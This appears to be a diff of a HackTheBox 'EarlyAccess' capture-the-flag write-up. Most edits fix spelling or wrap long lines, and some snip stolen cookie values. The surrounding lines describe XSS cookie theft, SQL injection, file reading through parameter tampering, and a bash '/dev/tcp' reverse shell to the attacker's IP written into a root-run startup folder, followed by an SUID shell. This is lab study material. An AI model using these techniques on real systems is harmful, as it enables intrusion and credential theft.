@@ -25,7 +25,7 @@ tags:
 
 ![earlyaccess](/assets/images/2022-01-30-21-21-48.png)
 
-EarlyAccess is a rated as a hard machine on HackTheBox. This was a long and complex box themed around an imaginary game development company. We start by registering to access a forum and find that there is an XSS vulnerability. Eventually we find a way to capture the admins session token and use it to gain access to the portal as them. This lets us download a key generator, and after deciphering how it works we generate a list of potentials and use Burp Intruder to brute force. With a valid key we can log in to a new area and there we find an SQLi vulnerability that we use to dump database credentials. This gives us a hash that we crack to gain access to a third area of the site. Here we use parameter tampering to retrieve files, leading to the discovery of a debug function that let's us finally get a reverse shell. Once inside we navigate around containers to find a tic-tac-toe game that we ultimately crash to gain root.
+EarlyAccess is a rated as a hard machine on HackTheBox. This was a long and complex box themed around an imaginary game development company. We start by registering to access a forum and find that there is an XSS vulnerability. Eventually we find a way to capture the admins session token and use it to gain access to the portal as them. This lets us download a key generator, and after deciphering how it works we generate a list of potentials and use Burp Intruder to brute force. With a valid key we can log in to a new area and there we find an SQLi vulnerability that we use to dump database credentials. This gives us a hash that we crack to gain access to a third area of the site. Here we use parameter tampering to retrieve files, leading to the discovery of a debug function that lets us finally get a reverse shell. Once inside we navigate around containers to find a tic-tac-toe game that we ultimately crash to gain root.
 
 <!--more-->
 
@@ -112,7 +112,7 @@ Another clue, this one suggesting there's a script running to read the messages 
 
 ## XSS Exploit
 
-It took me way to long to figure out what to do next! The first clue was that the username is vulnerable, it turns out you can do XSS with it. So first of all I found [this](https://stackoverflow.com/questions/247483/http-get-request-in-javascript):
+It took me way too long to figure out what to do next! The first clue was that the username is vulnerable, it turns out you can do XSS with it. So first of all I found [this](https://stackoverflow.com/questions/247483/http-get-request-in-javascript):
 
 ```js
 function httpGet(theUrl)
@@ -145,8 +145,10 @@ However it didn't work:
 Serving HTTP on 0.0.0.0 port 4443 (http://0.0.0.0:4443/) ...
 10.10.11.110 - - [30/Jan/2022 22:19:17] code 400, message Bad request version ('o\x9c)É«·\x00')
 o)É«· " 400 -F®j=[Ê0/Jan/2022 22:19:17] "ü¸Ù=¹Ä½3Å▒µÐ÷0+p¹@ÊØ·3]Ñ£ 
-10.10.11.110 - - [30/Jan/2022 22:19:17] code 400, message Bad request version ('éF\x05@\x92´\x1a\'%¥\x00"êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x00')
-10.10.11.110 - - [30/Jan/2022 22:19:17] "üZ(ÜW^ÿâF05O¼$µlf¨Ð¦r{Hoe²f» _k(êtoG"\/8ªlSMÀ¿k        éF@´▒'%¥"êêÀ+À/À,À0Ì©Ì¨ÀÀ/5" 400 -
+10.10.11.110 - - [30/Jan/2022 22:19:17] code 400, message Bad request version ('éF\x05@\x92´\x1a\
+'%¥\x00"êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x00')
+10.10.11.110 - - [30/Jan/2022 22:19:17] "üZ(ÜW^ÿâF05O¼$µlf¨Ð¦r{Hoe²f» _k(êtoG"\/8ªlSMÀ¿k        
+éF@´▒'%¥"êêÀ+À/À,À0Ì©Ì¨ÀÀ/5" 400 -
 ```
 
 So I tried a PHP server which gave me more information:
@@ -162,7 +164,7 @@ So I tried a PHP server which gave me more information:
 
 ## Python HTTPS Server
 
-I forgot the site is HTTPS so my server on Kali needs to be capable of that aswell. I searched for a python https server and found [this](https://stackoverflow.com/questions/19705785/python-3-simple-https-server), I just changed the server address, and the pem file name:
+I forgot the site is HTTPS so my server on Kali needs to be capable of that as well. I searched for a python https server and found [this](https://stackoverflow.com/questions/19705785/python-3-simple-https-server), I just changed the server address, and the pem file name:
 
 ```python
 import http.server, ssl
@@ -211,22 +213,30 @@ Then switch back to the box and send another message just like before:
 
 ## Admin Cookie Stealer
 
-Wait a few minutes and if all goes to plan we see the box make contact, our cookie stealing Javascript file is pulled back to the box and it returns the admin user cookie to us:
+Wait a few minutes and if all goes to plan we see the box make contact, our cookie stealing JavaScript file is pulled back to the box and it returns the admin user cookie to us:
 
 ```sh
 ┌──(root💀kali)-[~/htb/earlyaccess]
 └─# python3 https-server.py
 10.10.11.110 - - [30/Jan/2022 22:11:16] "GET /cookies.js HTTP/1.1" 200 -
 10.10.11.110 - - [30/Jan/2022 22:11:26] code 404, message File not found
-10.10.11.110 - - [30/Jan/2022 22:11:26] "GET /XSRF-TOKEN=eyJpdiI6IllUeTdhNWk5eDVCK3Y5WkJMTUlaOVE9PSIsInZhbHVlIjoiTVRmL3dVakpvbG54Z3Zkb1JHOTlFbVlLUFcxYVd0Q0NacThtTUVCdXpFbzcvaHE2Z0lJOEpLV1RiUkFKeHNTaC9UbW1IeVBodHQ3UEtFYXRDNVZxdzdvL0pGYmkrQmdnT2hmc2ptOTVvOGpjUzhmQk9Ja29XWGIwNnJXZ3EzK0YiLCJtYWMiOiJmNjZjZDg2ZWNkOWY3MTE1Njc3YWFjNGFkNmI0MDQ5ZjIxMzBjMWQ2NzNlNjVjNjhlMWMyMTI4NmFkMmVkMWZiIn0%3D;%20earlyaccess_session=eyJpdiI6IjV3Ly9ZTE5VQk5ERmhOTkVUbXZJQnc9PSIsInZhbHVlIjoia3JTTmJnYVo4amV3RkVSTFlUR3pxYVR5RVhjc0pwNU9ZWXlFdCtTdkpoUFRnU04wQUZjcHB5QWo0VFpRK3JFZ21lYS9IME1BQnN4MU5JSGVDVXBpWWhjbmM5VDJxZ0ZHZkEzL3h0cTZEUzViOFRaQWJuNzBUYmo5RzVSL1N4UVEiLCJtYWMiOiI3ODg2NzVjNTliM2IzYzBmYThlYTI0YTk2MmE4MDIzZDNjNWNiZWYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D HTTP/1.1" 404 -
+10.10.11.110 - - [30/Jan/2022 22:11:26] "GET /XSRF-TOKEN=eyJpdiI6IllUeTdhNWk5eDVCK
+FkNmI0MDQ5ZjI<SNIP>xMzBjMWQ2NzNlNjVjNjhlMWMyMTI4NmFkMmVkMWZiIn0%3D;%20
+earlyaccess_session=eyJpdiI6IjV3Ly9ZTE5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3J
+ThlYTI0YTk2MmE4MDIzZDNjNWNiZWYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D HTTP/1.1" 404 -
 ```
 
 Notice there are two cookies returned, XRSF-TOKEN and earlyaccess_session, we need the second one which I cut out like this:
 
 ```sh
 ┌──(root💀kali)-[~/htb/earlyaccess]
-└─# echo "XSRF-TOKEN=eyJpdiI6InJQNXRsdHJ0WElickUrMkJheFJSblE9PSIsInZhbHVlIjoiTGk3OFRjSmpBM0pGV1dITlQ0TDVlS1dMZW4zWlM3YXNsSVFRMXVOSXpEWmJneDBhVnRBN2lwdjRnY3BIaVQxS2tGd28vUFp2TUdIR1g0VlRmSjRsVkFNRUtxOEN4Z0xGaEoyR2hnVXZXbUhOWU5iaEZhd2taR1FQM1NLZ0Zyb04iLCJtYWMiOiJiYjNmYThhYTBlMjEzOTFkZjkzOGVmNTA2ZDExZDMxNmE5YTVkZDMwNDdlZjhkNzJjNThmYmY2Mjg4ZjBiZWQ2In0%3D;%20earlyaccess_session=eyJpdiI6Im1TcTZpVWdYaHNpdGczOEVBM2lXa2c9PSIsInZhbHVlIjoiV1RoNmFTazFFZTBqUktnY2VwYzBYWFV5aW5GRTFUNlBlYzhHLzN3NUl1VzlxQXdaekZKZWNCbnBXdEVZNDEySDVwckpxR1J5SE9GcWJOZURwN1VwdU00eGE1bkdNUVZvMzlsTjgwUlhkZytmL0dTVWd4OC9nYXZSN3ZobnovbWwiLCJtYWMiOiI2MGUzN2JlNTEzMTUyZmFhZDAzN2UxMzIzM2FkZWM4NzdjNTM1ZTViNDFhZjc5MTdjYjQyMWMyNzhkYzcxNGRjIn0%3D" | cut -d \; -f 2 | cut -d = -f 2
-eyJpdiI6Im1TcTZpVWdYaHNpdGczOEVBM2lXa2c9PSIsInZhbHVlIjoiV1RoNmFTazFFZTBqUktnY2VwYzBYWFV5aW5GRTFUNlBlYzhHLzN3NUl1VzlxQXdaekZKZWNCbnBXdEVZNDEySDVwckpxR1J5SE9GcWJOZURwN1VwdU00eGE1bkdNUVZvMzlsTjgwUlhkZytmL0dTVWd4OC9nYXZSN3ZobnovbWwiLCJtYWMiOiI2MGUzN2JlNTEzMTUyZmFhZDAzN2UxMzIzM2FkZWM4NzdjNTM1ZTViNDFhZjc5MTdjYjQyMWMyNzhkYzcxNGRjIn0%3D
+└─# echo "XSRF-TOKEN=eyJpdiI6IllUeTdhNWk5eDVCKFkNmI0MDQ5ZjI<SNIP>xMzBjMWQ2NzN
+lNjVjNjhlMWMyMTI4NmFkMmVkMWZiIn0%3D;%20earlyaccess_session=eyJpdiI6IjV3Ly9ZT
+E5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3JThlYTI0YTk2MmE4MDIzZDNjNWNiZ
+WYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D | cut -d \; -f 2 | cut -d = -f 2
+
+eyJpdiI6IjV3Ly9ZTE5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3JThlYTI0YT
+k2MmE4MDIzZDNjNWNiZWYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D
 ```
 
 Just copy the text after the two cuts and paste it in to the browser using Cookie Editor or similar:
@@ -440,7 +450,7 @@ print (str(checksum))
 
 Now we know how each part of the key is generated we can put the above together and create a script that gives us a list of all possible keys. It's actually only 59 keys so less to test than I first thought.
 
-With three of the five groups static we can simplify the script to just calulate the list of 59 vairations:
+With three of the five groups static we can simplify the script to just calculate the list of 59 variations:
 
 ```python
 import string
@@ -473,7 +483,7 @@ KEY10-0A0O0-XPAA6-GAMD0-1299
 <SNIP>
 ```
 
-With our list ready now go back to the Verify Game-Key area of the website, which we access as admin. Before entering a key to verify start Burp and set it listenting, also remember to set your browser to use Burp as it's proxy. Now paste anything in to the enter game-eky field and click Verify key:
+With our list ready now go back to the Verify Game-Key area of the website, which we access as admin. Before entering a key to verify start Burp and set it listening, also remember to set your browser to use Burp as its proxy. Now paste anything in to the enter game-key field and click Verify key:
 
 ![earlyaccess-admin-panel](/assets/images/2022-01-31-21-50-19.png)
 
@@ -523,7 +533,7 @@ The scoreboard shows how bad I did:
 
 ## SQLi Exploitation
 
-There's not a lot else to do here, but thinking back to the forum post we saw at the start it said the user SingleQuoteMan had a problem with his name on the scoreboard. This is a clue that we can use SQLi to retreive data. Switch back to our user profile and change the name:
+There's not a lot else to do here, but thinking back to the forum post we saw at the start it said the user SingleQuoteMan had a problem with his name on the scoreboard. This is a clue that we can use SQLi to retrieve data. Switch back to our user profile and change the name:
 
 ![earlyaccess-sqli-profile](/assets/images/2022-02-03-22-04-57.png)
 
@@ -689,7 +699,10 @@ Try to read hash.php:
 ┌──(root💀kali)-[~/htb/earlyaccess]
 └─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php
 <h2>Executing file:</h2><p>hash.php</p><br><br />
-<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in <b>/var/www/earlyaccess.htb/dev/actions/hash.php</b> on line <b>77</b><br /><h2>Executed file successfully!
+<b>Warning</b>:  Cannot modify header information - headers already sent by 
+(output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in 
+<b>/var/www/earlyaccess.htb/dev/actions/hash.php</b> on line <b>77</b>
+<br /><h2>Executed file successfully!
 ```
 
 This gives us a file path. Just like we did on [Timing](https://www.hackthebox.com/home/machines/profile/421) we can base64 encode the file to retrieve it:
@@ -817,7 +830,7 @@ user=api
 password=<HIDDEN>
 ```
 
-Looking around I eventally grepped for that api user and found this:
+Looking around I eventually grepped for that api user and found this:
 
 ```text
 www-adm@webserver:/var/www/html/app$ grep -ir api
@@ -896,7 +909,9 @@ Looking at it the contents is json so copy to Kali and use jq to read it:
       "--skip-character-set-client-handshake",
       "--max_allowed_packet=50MB",
       "--general_log=0",
-      "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"
+      "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,
+        NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,
+        REAL_AS_FLOAT,STRICT_ALL_TABLES"
     ],
     "Config": {
       "AttachStderr": false,
@@ -993,7 +1008,7 @@ done
 tail -f /dev/null
 ```
 
-This script is owned by root and is running anything in the docker-entrypoint.d folder. In there we see an script, let's look the contents of it:
+This script is owned by root and is running anything in the docker-entrypoint.d folder. In there we see a script, let's look the contents of it:
 
 ```text
 game-tester@game-server:~$ cat /docker-entrypoint.d/node-server.sh  
@@ -1004,7 +1019,7 @@ npm install
 sudo -u node node server.js
 ```
 
-A script called server.js is being run from the /usr/src/app folder. Looking at that script we see it's a game of tic-tac-toe, and is listening on port 9999. There's an autoplay function which let's us specify how many rounds to play, let's try it from SSH session on the earlyaccess server:
+A script called server.js is being run from the /usr/src/app folder. Looking at that script we see it's a game of tic-tac-toe, and is listening on port 9999. There's an autoplay function which lets us specify how many rounds to play, let's try it from SSH session on the earlyaccess server:
 
 ```html
 drew@earlyaccess:~$ curl -X POST -d "rounds=3" http://172.19.0.4:9999/autoplay 
@@ -1035,7 +1050,7 @@ In the script we also see this:
 
 So to get root on game-server we need a way of crashing the server, then when it restarts we need to have a file with a reverse shell in it in the /docker-entrypoint.d/ folder so it gets executed.
 
-On gameserver we see this:
+On game-server we see this:
 
 ```text
 game-tester@game-server:~$ ls -l /
@@ -1057,7 +1072,7 @@ So we have write access to the folder as drew on earlyaccess server, and that fo
 drew@earlyaccess:~$ while true; do echo "bash -i >& /dev/tcp/10.10.14.12/1337 0>&1" > /opt/docker-entrypoint.d/pencer.sh && chmod +x /opt/docker-entrypoint.d/pencer.sh && sleep 1; done
 ```
 
-Leave that running and start another SSH seesion as drew to earlyaccess.htb. From there call the script with autoplay as before, but this time use a negative value:
+Leave that running and start another SSH session as drew to earlyaccess.htb. From there call the script with autoplay as before, but this time use a negative value:
 
 ```text
 drew@earlyaccess:/opt/docker-entrypoint.d$ curl -X POST -d "rounds=-3" http://172.19.0.3:9999/autoplay
@@ -1085,7 +1100,7 @@ root@game-server:/# cd docker-entrypoint.d
 root@game-server:/docker-entrypoint.d# cp /bin/sh . && chmod u+s sh
 ```
 
-Finally back on earlyacces as drew we can escalate to root and grab the flag:
+Finally back on earlyaccess as drew we can escalate to root and grab the flag:
 
 ```text
 drew@earlyaccess:/opt/docker-entrypoint.d$ ls -lsa
